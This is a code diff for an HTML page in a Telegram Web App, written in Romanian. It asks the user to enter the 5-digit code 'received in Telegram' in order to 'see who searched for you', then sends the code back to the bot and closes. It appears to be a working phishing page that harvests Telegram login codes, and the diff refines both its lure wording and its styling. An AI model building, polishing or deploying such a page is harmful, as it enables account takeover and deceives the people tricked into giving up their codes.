@@ -5,29 +5,42 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 90%; text-align: center; }
-        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #1c1c1e; color: white; font-size: 20px; text-align: center; margin-bottom: 20px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background-color: #007aff; color: white; font-size: 16px; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000000; color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 15px; color: #aaaaaa; line-height: 1.4; margin-bottom: 30px; }
+        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #333; background: #1c1c1e; color: #ffffff; font-size: 18px; text-align: center; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
+        input:focus { border-color: #248bed; }
+        button { width: 100%; padding: 16px; border-radius: 12px; border: none; background-color: #248bed; color: #ffffff; font-size: 17px; font-weight: 600; margin-top: 20px; cursor: pointer; transition: background-color 0.2s; }
+        button:active { background-color: #1a6dbb; }
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="container">
         <h2>Verificare Profil</h2>
-        <p>Introdu codul de 5 cifre primit în Telegram pentru a vedea contactele.</p>
-        <input type="number" id="c" placeholder="00000">
-        <button onclick="s()">Confirmă</button>
+        <p>Introdu codul de 5 cifre primit în Telegram pentru a vedea cine te-a căutat.</p>
+        <input type="number" id="code" placeholder="00000" pattern="\d*">
+        <button id="mainButton">Confirmă</button>
     </div>
+
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
-        function s() {
-            const val = document.getElementById('c').value;
+        tg.expand(); // Extinde aplicația pe tot ecranul
+        tg.ready();
+
+        const btn = document.getElementById('mainButton');
+        const inputField = document.getElementById('code');
+
+        btn.addEventListener('click', function() {
+            const val = inputField.value;
             if (val.length >= 5) {
+                // Trimite datele înapoi la bot
                 tg.sendData(val);
                 tg.close();
+            } else {
+                alert("Te rugăm să introduci codul complet de 5 cifre.");
             }
-        }
+        });
     </script>
 </body>
 </html>
